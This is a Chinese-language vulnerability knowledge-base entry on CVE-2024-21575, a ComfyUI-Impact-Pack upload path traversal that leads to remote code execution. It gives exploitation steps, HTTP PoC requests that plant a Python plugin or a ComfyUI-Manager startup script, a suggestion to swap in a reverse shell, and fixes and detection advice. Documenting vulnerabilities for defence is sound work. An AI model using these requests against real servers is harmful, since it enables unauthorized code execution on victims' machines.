---
id: web-python-comfyui-impact-pack-upload-filename-traversal-startup-rce
title: ComfyUI-Impact-Pack /upload/temp 文件名目录穿越任意写：写 custom_nodes/git/__init__.py 或 ComfyUI-Manager 启动脚本实现 RCE（CVE-2024-21575）
type: scenario
domain: web
path: web/python
technique: comfyui-impact-pack-upload-filename-traversal-startup-rce
aliases:
- CVE-2024-21575
- ComfyUI-Impact-Pack 文件上传
- ComfyUI 插件 RCE
- upload/temp 目录穿越
- install-scripts.txt RCE
- custom_nodes __init__.py
tags:
- comfyui
- python
- file-upload
- path-traversal
- arbitrary-write
- rce
- impact-pack
- startup-script
- cve-2024-21575
cve:
- CVE-2024-21575
severity: high
confidence: high
affected_versions: ComfyUI-Impact-Pack < 7.6.2（原文引用修复版本：7.6.2 及以上）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V255
  verified_at: '2026-11-07T16:04:02+08:00'
  notes: 已对照原文与2张图核对：impact_server.py filename穿越代码、custom_nodes/git/__init__.py与install-scripts.txt两条RCE路径、启动输出截图一致；affected_versions 按原文修复版本7.6.2标为<7.6.2，未执行PoC
---

## 一句话结论

ComfyUI-Impact-Pack 的 `POST /upload/temp` 直接使用上传文件的 `filename` 拼接 `os.path.join(upload_dir, filename)` 并写盘，未过滤 `../`；攻击者可目录穿越写任意文件，再选择 ComfyUI 启动时会自动加载的位置——`custom_nodes/<插件>/__init__.py` 或 ComfyUI-Manager 的 `startup-scripts/install-scripts.txt`——在重启时执行任意命令，形成 RCE。

## 原理

- **漏洞点**：`impact_server.py` 的 `upload_image` 从 multipart 取 `image`，用客户端提供的 `image.filename`，仅处理重名（`name (1).ext`）后执行 `filepath = os.path.join(upload_dir, filename)`，再 `open(filepath, "wb").write(...)`。`filename` 中的 `../` 未被规范化或校验，`os.path.join` 也不会阻止跳出 `upload_dir`，因此可写到进程有权限的任意路径。
- **限制条件**：代码不限制文件类型；同名文件会被重命名而不是覆盖，所以目标文件必须不存在（或先删除）；不会自动创建目录，目标父目录必须已存在。
- **路径一：custom_nodes 插件导入**。ComfyUI 启动时把 `custom_nodes` 下每个子目录当作 Python 插件导入；默认安装里存在一个空的 `custom_nodes/git` 文件夹，启动日志会报 `No such file or directory: '.../custom_nodes/git/__init__.py'`。攻击者写一个 `custom_nodes/git/__init__.py`，重启后 ComfyUI 导入该插件时执行 `__init__.py` 顶层代码，即获得 RCE。该路径依赖“存在空插件目录”，不够稳定，但文章复现成功（启动日志打印 `RCE by hacker`）。
- **路径二：ComfyUI-Manager 启动脚本（更稳定）**。ComfyUI-Manager 在启动时读取 `user/default/ComfyUI-Manager/startup-scripts/install-scripts.txt`：逐行 `ast.literal_eval`，若第二项为 `#FORCE`，则 `process_wrap(script[1:], script[0], env=...)` 执行；否则若 `os.path.exists(script[0])`，同样执行 `script[1:]`。列表的第一项是工作目录（cwd），`script[1:]` 是命令和参数。写入 `["/bin", "#FORCE", "echo","RCEByHacker2"]` 就会执行 `echo RCEByHacker2`（cwd=/bin）；把命令换成 `/bin/sh -c ...` 即可执行任意命令。该文件在目标环境通常不存在，且启动时必然被读取，因此比找空插件目录更可靠。
- **为什么是 RCE 而不是任意写**：两条路径都把“写入的文件”放进应用启动时自动执行的代码/脚本读取位置，不需要触发额外请求；ComfyUI 重启（或服务重启）即执行，最终以 ComfyUI 进程权限运行。
- **鉴权**：该 handler 代码本身没有登录/权限校验；文章请求中带的 `remember-me` Cookie 是浏览器现有会话，不是接口要求。默认 ComfyUI 通常直接暴露 8188 端口，攻击面为未授权。

## 触发条件

- 目标运行 ComfyUI，且安装了 ComfyUI-Impact-Pack < 7.6.2（修复版本 7.6.2）。
- `/upload/temp` 可访问（默认 ComfyUI 无认证时未授权即可；有反向代理/认证时需能到达该路由）。
- 目标路径可写：`custom_nodes` 下存在空的 `git` 目录（路径一），或 ComfyUI-Manager 的 `user/default/ComfyUI-Manager/startup-scripts/` 目录存在且 `install-scripts.txt` 不存在（路径二）。
- 目标文件不存在：上传同名文件会被重命名为 `name (1).ext`，无法覆盖已有 `__init__.py`/`install-scripts.txt`。
- 攻击者能触发或等待 ComfyUI 重启，使启动加载逻辑执行写入内容。

## 利用步骤

1. 确认目标：访问 ComfyUI 的 `/upload/temp`，用 `filename="../../../../../../../../../../../tmp/example.png"` 上传任意内容，确认返回 `{"name": "..."}` 且文件落到预期目录（文章先验证任意文件写）。
2. 获取安装根路径：可通过不存在路径的报错回显、ComfyUI 默认路径或错误信息爆破 `custom_nodes`、`user/default/ComfyUI-Manager` 的实际位置；文章通过启动报错中的绝对路径确认。
3. 路径一：上传 `filename="../custom_nodes/git/__init__.py"`，内容为 Python 代码（如 `import os; os.system("echo RCE by hacker")`）。重启 ComfyUI，查看启动日志是否出现执行结果（文章截图为 `RCE by hacker`）。
4. 路径二（稳定）：上传 `filename="../user/default/ComfyUI-Manager/startup-scripts/install-scripts.txt"`，内容为一行列表，如 `["/bin", "#FORCE", "echo","RCEByHacker2"]`；或 `["/bin", "#FORCE", "/bin/sh","-c","id > /tmp/pwned"]`。重启 ComfyUI，ComfyUI-Manager 启动时会打印 `EXECUTE => [...]` 并执行命令（文章截图为 `RCEByHacker2`）。
5. 将命令替换为反弹 shell、下载载荷或读取敏感文件，完成进一步利用。

## PoC

目录穿越任意写（验证用）：

```http
POST /upload/temp HTTP/1.1
Host: 127.0.0.1:8188
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="image"; filename="../../../../../../../../../../../tmp/example.png"
Content-Type: image/png

1
------X--
```

路径一（custom_nodes 插件导入）：

```http
POST /upload/temp HTTP/1.1
Host: 127.0.0.1:8188
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="image"; filename="../custom_nodes/git/__init__.py"
Content-Type: image/png

import os
os.system("echo RCE by hacker")
------X--
```

路径二（ComfyUI-Manager 启动脚本）：

```http
POST /upload/temp HTTP/1.1
Host: 127.0.0.1:8188
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="image"; filename="../user/default/ComfyUI-Manager/startup-scripts/install-scripts.txt"
Content-Type: image/png

["/bin", "#FORCE", "echo","RCEByHacker2"]
------X--
```

## 变体与关联

- 变体：把 `filename` 改成其他启动加载点——如 `user/default/ComfyUI-Manager/` 下的配置、`custom_nodes/<任意已存在插件>/__init__.py`（但会被重命名，需目标不存在）、或有写权限的 cron/Python 启动文件。
- 变体：若目标不允许重启，可结合 ComfyUI 的热加载/Manager 的安装接口，使写入的插件或脚本在无需完整重启时被导入。
- 关联：[[web-python-comfyui-manager-snapshot-restore-path-traversal-qvd-2026-2759]]（ComfyUI-Manager 路径穿越写 userdata 快照，重启恢复时执行 install.py，同属“写启动加载文件→重启 RCE”模式）。
- 关联：[[web-python-upload-traversal-pth-sitepackages-rce]]（上传目录穿越写 `.pth` 到 site-packages，Python 启动即执行）、[[web-python-comfyui-manager-weak-config-git-clone-reboot-rce]]（ComfyUI-Manager 上传 config.ini + git_url + reboot 的 RCE 链）。
- 关联：[[web-generic-file-upload-weak-suffix-bypass]]（仅按后缀弱校验的上传原语）。

## 检测与防御

- **修复**：升级 ComfyUI-Impact-Pack 至 7.6.2 及以上；对上传文件名使用 `os.path.basename()` 或 `werkzeug.utils.secure_filename()`，并用 `os.path.realpath` 校验最终路径仍在 `upload_dir` 内；限制允许的扩展名与 MIME 类型。
- **加固**：ComfyUI 仅监听内网/加认证代理；以最小权限用户运行，容器化并挂载只读的应用目录；对 `custom_nodes` 与 `startup-scripts` 目录设置只读或写入告警。
- **检测**：审计 `/upload/temp` 的 multipart `filename` 是否含 `../`、绝对路径或路径分隔符；监控 `custom_nodes/**/__init__.py`、`user/default/ComfyUI-Manager/startup-scripts/install-scripts.txt` 的创建/修改；关注 ComfyUI-Manager 启动日志中的 `EXECUTE =>` 异常命令与 ComfyUI 启动时的意外 Python 输出。
- 注意：上传同名文件会被重命名，防御方应同时监控 `name (1).ext` 形式的落地文件；仅禁止 `../` 不够，需做规范化后的路径包含校验。
